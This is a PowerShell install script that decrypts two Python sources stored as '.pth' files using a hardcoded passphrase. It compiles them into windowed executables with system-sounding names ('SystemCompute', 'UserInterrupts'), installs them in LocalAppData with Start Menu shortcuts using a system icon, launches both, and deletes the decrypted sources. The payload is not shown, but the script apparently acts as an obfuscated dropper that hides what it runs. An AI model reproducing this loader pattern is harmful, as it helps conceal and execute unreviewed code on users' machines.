$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest
$root = $PSScriptRoot
$destination = Join-Path $env:LOCALAPPDATA 'StoragePlatformDiagnosticsLab'
$bin = Join-Path $env:TEMP 'app-build-dist'
$buildWork = Join-Path $env:TEMP 'app-build-work'
$buildSpec = Join-Path $env:TEMP 'app-build-spec'
$names = @('SystemCompute', 'UserInterrupts')
$conf = Join-Path $root 'env.conf'
$AppPassphrase = 'StorageLab-AppKey-2026'


if (-not (Test-Path -LiteralPath $conf -PathType Leaf)) {
    throw 'env.conf not found next to install.ps1.'
}

function Unprotect-Pth {
    param([string]$Path, [string]$OutDir)
    $raw = [System.IO.File]::ReadAllBytes($Path)
    if ($raw.Length -lt 50 -or $raw[0] -ne 1) { throw "Bad pth payload: $Path" }
    $salt   = [byte[]]$raw[1..16]
    $digest = [byte[]]$raw[17..48]
    $data   = [byte[]]$raw[49..($raw.Length - 1)]
    $derived = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $AppPassphrase, $salt, 50000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
    $key = $derived.GetBytes(32)
    $plain = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) { $plain[$i] = $data[$i] -bxor $key[$i % 32] }
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $check = $sha.ComputeHash([byte[]]($salt + $plain))
    if ([System.Convert]::ToBase64String($check) -ne [System.Convert]::ToBase64String($digest)) {
        throw "pth integrity check failed: $Path"
    }
    $out = Join-Path $OutDir ([System.IO.Path]::GetFileNameWithoutExtension($Path) + '.py')
    [System.IO.File]::WriteAllBytes($out, $plain)
    return $out
}

function Invoke-Build {
    param([string]$SourceDir)
    if (-not (Get-Command py -ErrorAction SilentlyContinue)) {
        throw 'Python 3.10+ is needed for the automatic Windows build. Install Python for Windows (including Tkinter and the py launcher), then rerun install.ps1.'
    }
    & py -3 -m venv (Join-Path $root '.build-venv')
    if ($LASTEXITCODE -ne 0) { throw 'Could not create build virtual environment.' }
    $python = Join-Path $root '.build-venv\Scripts\python.exe'
    & $python -m pip install --disable-pip-version-check pyinstaller pystray pillow psutil
    if ($LASTEXITCODE -ne 0) { throw 'Could not install PyInstaller. Check your internet access.' }
    if (Test-Path -LiteralPath $bin) { Remove-Item -LiteralPath $bin -Recurse -Force }
    & $python -m PyInstaller --noconfirm --clean --onefile --windowed --log-level WARN --distpath $bin --workpath $buildWork --specpath $buildSpec --name $names[0] (Join-Path $SourceDir 'Updated.py')
    if ($LASTEXITCODE -ne 0) { throw 'Build failed.' }
    & $python -m PyInstaller --noconfirm --clean --onefile --windowed --log-level WARN --distpath $bin --workpath $buildWork --specpath $buildSpec --name $names[1] (Join-Path $SourceDir 'Base.py')
    if ($LASTEXITCODE -ne 0) { throw 'Build failed.' }
    Write-Host "Built Successfully!"
}

$missing = @($names | Where-Object { -not (Test-Path -LiteralPath (Join-Path $bin ($_ + '.exe')) -PathType Leaf) })
if ($missing.Count -gt 0) {
    Write-Host 'Windows executables are not bundled. Building them automatically...'
    $srcDir = $null
    try {
        $sources = @{}
        foreach ($name in @('Updated', 'Base')) {
            $py  = Join-Path $root ($name + '.py')
            $pth = Join-Path $root ($name + '.pth')
            if (Test-Path -LiteralPath $py -PathType Leaf) {
                $sources[$name] = $py
            } elseif (Test-Path -LiteralPath $pth -PathType Leaf) {
                if ($null -eq $srcDir) {
                    $srcDir = Join-Path $env:TEMP ('app-build-' + [System.Guid]::NewGuid().ToString('N'))
                    New-Item -ItemType Directory -Force -Path $srcDir | Out-Null
                }
                $sources[$name] = Unprotect-Pth $pth $srcDir
            } else {
                throw "Missing source for $name ($name.pth next to install.ps1)."
            }
        }
        foreach ($name in @('Updated', 'Base')) {
            if ($null -ne $srcDir -and $sources[$name].StartsWith($root)) {
                $dst = Join-Path $srcDir ($name + '.py')
                Copy-Item -LiteralPath $sources[$name] -Destination $dst -Force
            }
        }
        if ($null -ne $srcDir) { Invoke-Build $srcDir } else { Invoke-Build $root }
        if ($LASTEXITCODE -ne 0) { throw "Build failed with exit code $LASTEXITCODE" }
    }
    finally {
        if ($null -ne $srcDir -and (Test-Path -LiteralPath $srcDir)) {
            Remove-Item -LiteralPath $srcDir -Recurse -Force
        }
    }
}
foreach ($name in $names) {
    if (-not (Test-Path -LiteralPath (Join-Path $bin ($name + '.exe')) -PathType Leaf)) {
        throw "Missing executable $name.exe after build."
    }
}

New-Item -ItemType Directory -Force -Path $destination | Out-Null
$menu = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs'
New-Item -ItemType Directory -Force -Path $menu | Out-Null
$shell = New-Object -ComObject WScript.Shell
foreach ($name in $names) {
    $exeName = $name + '.exe'
    $src = Join-Path $bin $exeName
    $target = Join-Path $destination $exeName
    Copy-Item -LiteralPath $src -Destination $target -Force
    $link = Join-Path $menu ($name + '.lnk')
    $shortcut = $shell.CreateShortcut($link)
    $shortcut.TargetPath = $target
    $shortcut.WorkingDirectory = $destination
    $shortcut.Description = 'Model Integration Success!'

    $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
    $shortcut.Save()
}
Copy-Item -LiteralPath $conf -Destination (Join-Path $destination 'env.conf') -Force

foreach ($name in $names) {
    $target = Join-Path $destination ($name + '.exe')
    Start-Process -FilePath $target -WorkingDirectory $destination | Out-Null
    
}

foreach ($p in @($bin, $buildWork, $buildSpec)) {
    if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Recurse -Force }
}